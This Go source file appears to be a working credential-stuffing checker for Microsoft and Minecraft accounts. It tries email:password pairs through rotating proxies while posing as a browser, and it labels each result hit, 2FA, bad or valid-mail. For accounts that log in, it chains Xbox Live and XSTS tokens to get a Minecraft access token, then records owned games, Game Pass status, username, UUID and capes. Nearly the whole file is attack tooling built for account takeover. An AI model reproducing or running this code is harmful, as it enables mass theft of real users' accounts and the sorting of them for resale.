package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"
)

const (
	loginURL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
	xboxURL  = "https://user.auth.xboxlive.com/user/authenticate"
	xstsURL  = "https://xsts.auth.xboxlive.com/xsts/authorize"
	mcAuthURL = "https://api.minecraftservices.com/authentication/login_with_xbox"
	mcProfileURL = "https://api.minecraftservices.com/minecraft/profile"
	mcStoreURL   = "https://api.minecraftservices.com/entitlements/mcstore"
)

// AuthResult holds everything we learn from checking a combo.
type AuthResult struct {
	Email    string
	Password string
	Type     string // Hit, 2FA, Bad, ValidMail, XGP, XGPU, Other
	AccType  string // Normal Minecraft, Xbox Game Pass Ultimate, etc.
	Username string
	UUID     string
	Capes    string
	MCToken  string
}

// authSession holds a per-combo HTTP session.
type authSession struct {
	client *http.Client
	cfg    *Config
}

func newSession(cfg *Config) *authSession {
	jar, _ := cookiejar.New(nil)
	transport := makeTransport(gProxies.proxyType, gProxies.random())
	client := &http.Client{
		Jar:       jar,
		Transport: transport,
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	return &authSession{client: client, cfg: cfg}
}

func (s *authSession) get(rawURL string, headers map[string]string) (*http.Response, []byte, error) {
	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := s.client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp, body, nil
}

func (s *authSession) postForm(rawURL string, data url.Values, headers map[string]string) (*http.Response, []byte, error) {
	req, err := http.NewRequest("POST", rawURL, strings.NewReader(data.Encode()))
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := s.client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp, body, nil
}

func (s *authSession) postJSON(rawURL string, payload interface{}, headers map[string]string) (*http.Response, []byte, error) {
	data, err := json.Marshal(payload)
	if err != nil {
		return nil, nil, err
	}
	req, err := http.NewRequest("POST", rawURL, bytes.NewReader(data))
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := s.client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp, body, nil
}

// followRedirect manually follows a redirect and returns the final Location.
func (s *authSession) followRedirect(location string) (string, []byte, error) {
	for i := 0; i < 10; i++ {
		resp, body, err := s.get(location, nil)
		if err != nil {
			return "", nil, err
		}
		if resp.StatusCode >= 300 && resp.StatusCode < 400 {
			loc := resp.Header.Get("Location")
			if loc == "" {
				return location, body, nil
			}
			// If relative, resolve
			if !strings.HasPrefix(loc, "http") {
				base, _ := url.Parse(location)
				rel, _ := url.Parse(loc)
				loc = base.ResolveReference(rel).String()
			}
			// Fragment in location = we have our token
			if strings.Contains(loc, "#") {
				return loc, body, nil
			}
			location = loc
			continue
		}
		return location, body, nil
	}
	return location, nil, fmt.Errorf("too many redirects")
}

var (
	reSFTTag   = regexp.MustCompile(`value="([^"]{100,})"`)
	reURLPost  = regexp.MustCompile(`"urlPost":"([^"]+)"`)
	reIPT      = regexp.MustCompile(`"ipt" value="([^"]+)"`)
	rePPRID    = regexp.MustCompile(`"pprid" value="([^"]+)"`)
	reUAID     = regexp.MustCompile(`"uaid" value="([^"]+)"`)
	reFmHF     = regexp.MustCompile(`id="fmHF" action="([^"]+)"`)
	reReturnURL = regexp.MustCompile(`"recoveryCancel":\{"returnUrl":"([^"]+)"`)
)

// Step 1: Get sFTTag and urlPost from the login page.
func (s *authSession) getLoginForm() (sFTTag, urlPost string, err error) {
	_, body, err := s.get(loginURL, nil)
	if err != nil {
		return
	}
	text := string(body)

	m := reSFTTag.FindStringSubmatch(text)
	if m == nil {
		err = fmt.Errorf("sFTTag not found")
		return
	}
	sFTTag = m[1]

	m2 := reURLPost.FindStringSubmatch(text)
	if m2 == nil {
		err = fmt.Errorf("urlPost not found")
		return
	}
	urlPost = strings.ReplaceAll(m2[1], `\u0026`, "&")
	return
}

// Step 2: Submit credentials and extract the Xbox RPS token.
func (s *authSession) login(email, password, urlPost, sFTTag string) (rpsToken string, resultType string, err error) {
	data := url.Values{
		"login":    {email},
		"loginfmt": {email},
		"passwd":   {password},
		"PPFT":     {sFTTag},
	}

	resp, body, err := s.postForm(urlPost, data, nil)
	if err != nil {
		return "", "error", err
	}
	text := string(body)

	// Check for redirect with access_token in Location header
	if resp.StatusCode == 302 || resp.StatusCode == 301 {
		loc := resp.Header.Get("Location")
		if strings.Contains(loc, "#") {
			token, ok := extractFragment(loc, "access_token")
			if ok {
				return token, "hit", nil
			}
		}
		// Follow the redirect
		finalLoc, finalBody, ferr := s.followRedirect(loc)
		if ferr == nil {
			if strings.Contains(finalLoc, "#") {
				token, ok := extractFragment(finalLoc, "access_token")
				if ok {
					return token, "hit", nil
				}
			}
			text = string(finalBody)
		}
	}

	// Check for "cancel" recovery flow
	if strings.Contains(text, "cancel?mkt=") {
		ipt := extractRegex(text, reIPT)
		pprid := extractRegex(text, rePPRID)
		uaid := extractRegex(text, reUAID)
		action := extractRegex(text, reFmHF)

		if ipt != "" && pprid != "" && uaid != "" && action != "" {
			retData := url.Values{"ipt": {ipt}, "pprid": {pprid}, "uaid": {uaid}}
			retResp, retBody, _ := s.postForm(action, retData, nil)
			_ = retResp
			returnURL := extractRegex(string(retBody), reReturnURL)
			if returnURL != "" {
				finalLoc, _, _ := s.followRedirect(returnURL)
				if strings.Contains(finalLoc, "#") {
					token, ok := extractFragment(finalLoc, "access_token")
					if ok {
						return token, "hit", nil
					}
				}
			}
		}
	}

	// 2FA check
	lower := strings.ToLower(text)
	if strings.Contains(lower, "recover?mkt") ||
		strings.Contains(lower, "identity/confirm") ||
		strings.Contains(lower, "email/confirm") ||
		strings.Contains(lower, "/abuse?mkt=") ||
		strings.Contains(lower, "proofs.microsoft.com") {
		return "", "2fa", nil
	}

	// Bad password / account not found
	if strings.Contains(lower, "password is incorrect") ||
		strings.Contains(lower, "account doesn") ||
		strings.Contains(lower, "sign in to your microsoft account") ||
		strings.Contains(lower, "tried to sign in too many times") {
		return "", "bad", nil
	}

	return "", "bad", nil
}

// Step 3: Xbox Live authentication.
func (s *authSession) xboxAuth(rpsToken string) (xboxToken, uhs string, err error) {
	payload := map[string]interface{}{
		"Properties": map[string]interface{}{
			"AuthMethod": "RPS",
			"SiteName":   "user.auth.xboxlive.com",
			"RpsTicket":  rpsToken,
		},
		"RelyingParty": "http://auth.xboxlive.com",
		"TokenType":    "JWT",
	}
	_, body, err := s.postJSON(xboxURL, payload, nil)
	if err != nil {
		return
	}
	var js map[string]interface{}
	if e := json.Unmarshal(body, &js); e != nil {
		err = e
		return
	}
	xboxToken, _ = js["Token"].(string)
	if dc, ok := js["DisplayClaims"].(map[string]interface{}); ok {
		if xui, ok := dc["xui"].([]interface{}); ok && len(xui) > 0 {
			if item, ok := xui[0].(map[string]interface{}); ok {
				uhs, _ = item["uhs"].(string)
			}
		}
	}
	if xboxToken == "" {
		err = fmt.Errorf("empty xbox token")
	}
	return
}

// Step 4: XSTS authorization.
func (s *authSession) xstsAuth(xboxToken string) (xstsToken string, err error) {
	payload := map[string]interface{}{
		"Properties": map[string]interface{}{
			"SandboxId":  "RETAIL",
			"UserTokens": []string{xboxToken},
		},
		"RelyingParty": "rp://api.minecraftservices.com/",
		"TokenType":    "JWT",
	}
	_, body, err := s.postJSON(xstsURL, payload, nil)
	if err != nil {
		return
	}
	var js map[string]interface{}
	if e := json.Unmarshal(body, &js); e != nil {
		err = e
		return
	}
	xstsToken, _ = js["Token"].(string)
	if xstsToken == "" {
		err = fmt.Errorf("empty xsts token")
	}
	return
}

// Step 5: Get Minecraft access token.
func (s *authSession) mcAuth(uhs, xstsToken string) (mcToken string, err error) {
	payload := map[string]string{
		"identityToken": fmt.Sprintf("XBL3.0 x=%s;%s", uhs, xstsToken),
	}
	_, body, err := s.postJSON(mcAuthURL, payload, nil)
	if err != nil {
		return
	}
	var js map[string]interface{}
	if e := json.Unmarshal(body, &js); e != nil {
		err = e
		return
	}
	mcToken, _ = js["access_token"].(string)
	if mcToken == "" {
		err = fmt.Errorf("empty mc token")
	}
	return
}

// Step 6: Check MC ownership/entitlements.
func (s *authSession) checkOwnership(mcToken string) (accType string, err error) {
	_, body, err := s.get(mcStoreURL, map[string]string{
		"Authorization": "Bearer " + mcToken,
	})
	if err != nil {
		return
	}
	var js map[string]interface{}
	if e := json.Unmarshal(body, &js); e != nil {
		err = e
		return
	}

	items, _ := js["items"].([]interface{})
	hasNormal, hasXGPU, hasXGP := false, false, false

	for _, raw := range items {
		item, _ := raw.(map[string]interface{})
		name, _ := item["name"].(string)
		source, _ := item["source"].(string)
		switch name {
		case "game_minecraft", "product_minecraft":
			if source == "PURCHASE" || source == "MC_PURCHASE" {
				hasNormal = true
			}
		case "product_game_pass_ultimate":
			hasXGPU = true
		case "product_game_pass_pc":
			hasXGP = true
		}
	}

	switch {
	case hasNormal && hasXGPU:
		accType = "Normal Minecraft (with Game Pass Ultimate)"
	case hasNormal && hasXGP:
		accType = "Normal Minecraft (with Game Pass)"
	case hasNormal:
		accType = "Normal Minecraft"
	case hasXGPU:
		accType = "Xbox Game Pass Ultimate"
	case hasXGP:
		accType = "Xbox Game Pass (PC)"
	default:
		// Check for other products
		raw := string(body)
		var others []string
		if strings.Contains(raw, "product_minecraft_bedrock") {
			others = append(others, "Minecraft Bedrock")
		}
		if strings.Contains(raw, "product_legends") {
			others = append(others, "Minecraft Legends")
		}
		if strings.Contains(raw, "product_dungeons") {
			others = append(others, "Minecraft Dungeons")
		}
		if len(others) > 0 {
			accType = "Other (" + strings.Join(others, ", ") + ")"
		} else {
			accType = ""
		}
	}
	return
}

// Step 7: Get Minecraft profile.
type MCProfile struct {
	ID    string `json:"id"`
	Name  string `json:"name"`
	Capes []struct {
		Alias string `json:"alias"`
	} `json:"capes"`
}

func (s *authSession) getMCProfile(mcToken string) (*MCProfile, error) {
	_, body, err := s.get(mcProfileURL, map[string]string{
		"Authorization": "Bearer " + mcToken,
	})
	if err != nil {
		return nil, err
	}
	var p MCProfile
	if e := json.Unmarshal(body, &p); e != nil {
		return nil, e
	}
	if p.ID == "" {
		return nil, fmt.Errorf("no profile")
	}
	return &p, nil
}

// CheckCombo runs the full auth chain for a single email:password combo.
func CheckCombo(cfg *Config, email, password string) *AuthResult {
	result := &AuthResult{Email: email, Password: password}
	sess := newSession(cfg)
	maxRetries := cfg.MaxRetries

	// Step 1: get login form
	var sFTTag, urlPost string
	var err error
	for i := 0; i < maxRetries; i++ {
		sFTTag, urlPost, err = sess.getLoginForm()
		if err == nil {
			break
		}
		incRetry()
		time.Sleep(500 * time.Millisecond)
		// Rotate proxy
		sess = newSession(cfg)
	}
	if err != nil {
		incBad()
		result.Type = "Bad"
		return result
	}

	// Step 2: login
	var rpsToken, loginType string
	for i := 0; i < maxRetries; i++ {
		rpsToken, loginType, err = sess.login(email, password, urlPost, sFTTag)
		if loginType == "bad" || loginType == "2fa" {
			break
		}
		if err == nil && loginType == "hit" {
			break
		}
		incRetry()
		time.Sleep(500 * time.Millisecond)
	}

	switch loginType {
	case "bad":
		incBad()
		result.Type = "Bad"
		return result
	case "2fa":
		inc2FA()
		result.Type = "2FA"
		return result
	case "error":
		incBad()
		result.Type = "Bad"
		return result
	}

	if rpsToken == "" {
		incBad()
		result.Type = "Bad"
		return result
	}

	// Step 3: Xbox
	xboxToken, uhs, err := sess.xboxAuth(rpsToken)
	if err != nil {
		incVM()
		result.Type = "ValidMail"
		return result
	}

	// Step 4: XSTS
	xstsToken, err := sess.xstsAuth(xboxToken)
	if err != nil {
		incVM()
		result.Type = "ValidMail"
		return result
	}

	// Step 5: MC token
	mcToken, err := sess.mcAuth(uhs, xstsToken)
	if err != nil {
		incVM()
		result.Type = "ValidMail"
		return result
	}
	result.MCToken = mcToken

	// Step 6: Ownership check
	accType, err := sess.checkOwnership(mcToken)
	if err != nil || accType == "" {
		// Check for bedrock/other in raw again
		if accType == "" {
			incVM()
			result.Type = "ValidMail"
			return result
		}
	}

	result.AccType = accType

	// Categorize
	switch {
	case accType == "Xbox Game Pass Ultimate" || strings.Contains(accType, "with Game Pass Ultimate"):
		incXGPU()
		result.Type = "XGPU"
	case accType == "Xbox Game Pass (PC)" || strings.Contains(accType, "with Game Pass)"):
		incXGP()
		result.Type = "XGP"
	case accType == "Normal Minecraft":
		incHit()
		result.Type = "Hit"
	case strings.HasPrefix(accType, "Other"):
		incOther()
		result.Type = "Other"
	default:
		incVM()
		result.Type = "ValidMail"
		return result
	}

	// Step 7: MC Profile
	profile, err := sess.getMCProfile(mcToken)
	if err == nil {
		result.Username = profile.Name
		result.UUID = profile.ID
		var capeNames []string
		for _, c := range profile.Capes {
			capeNames = append(capeNames, c.Alias)
		}
		if len(capeNames) > 0 {
			result.Capes = strings.Join(capeNames, ", ")
		}
	} else {
		result.Username = "N/A"
	}

	return result
}

// Helpers

func extractFragment(rawURL, key string) (string, bool) {
	idx := strings.Index(rawURL, "#")
	if idx == -1 {
		return "", false
	}
	fragment := rawURL[idx+1:]
	params, err := url.ParseQuery(fragment)
	if err != nil {
		return "", false
	}
	v := params.Get(key)
	return v, v != ""
}

func extractRegex(text string, re *regexp.Regexp) string {
	m := re.FindStringSubmatch(text)
	if m == nil {
		return ""
	}
	return m[1]
}
